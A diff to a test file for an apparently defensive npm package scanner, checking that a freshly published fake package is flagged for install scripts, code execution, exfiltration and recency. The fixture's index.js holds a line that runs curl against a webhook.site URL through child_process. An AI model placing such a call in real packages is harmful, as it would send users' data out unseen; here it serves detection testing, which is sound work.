@@ -44,13 +44,14 @@ function store() {
 const version = (name, number, files, extra, published) => ({ ...packageOf(name, number, files, extra), published })
 const ids = assessment => assessment.findings.map(({ id }) => id)
 
-test('a version alone: everything of it new, its files stamped, too new under the minimum release age', async t => {
+test('a version alone: what it holds, its files stamped, too new under the minimum release age', async t => {
   const files = { 'package.json': '{"name":"lone"}', 'index.js': 'require("child_process").exec("curl https://webhook.site/x")\n', 'README.md': '# lone' }
   npm(t, [{ name: 'lone', versions: [version('lone', '1.0.0', files, { dependencies: {}, scripts: { postinstall: 'node setup.js' } }, ago(1))] }])
   const assessment = await assessNpm('lone', '1.0.0', { now: NOW, downloads: false })
   assert.equal(assessment.published, ago(1))
-  assert.deepEqual(ids(assessment), ['install-scripts', 'runs-code', 'exfiltration', 'new-hosts', 'too-new'])
-  assert.deepEqual(assessment.findings.find(({ id }) => id === 'runs-code'), { id: 'runs-code', severity: 'critical', files: [{ path: 'index.js', added: { 'child-process': [1] } }] })
+  assert.deepEqual(ids(assessment), ['held-install-scripts', 'held-runs-code', 'held-exfiltration', 'too-new'], 'as the Overview flags a version on its own')
+  assert.deepEqual(assessment.findings.find(({ id }) => id === 'held-runs-code'), { id: 'held-runs-code', severity: 'high', files: [{ path: 'index.js', found: { 'child-process': [1] } }] })
+  assert.deepEqual(assessment.findings[0], { id: 'held-install-scripts', severity: 'high', scripts: [['postinstall', 'node setup.js']] })
   assert.deepEqual(assessment.files['index.js'].stamps, [{ name: 'child_process', severity: 'high' }, { name: 'Exfiltration', severity: 'high' }])
   assert.deepEqual(assessment.files['index.js'].exfiltration, { 'webhook-site': [1] })
   assert.deepEqual(assessment.files['README.md'].stamps, [])
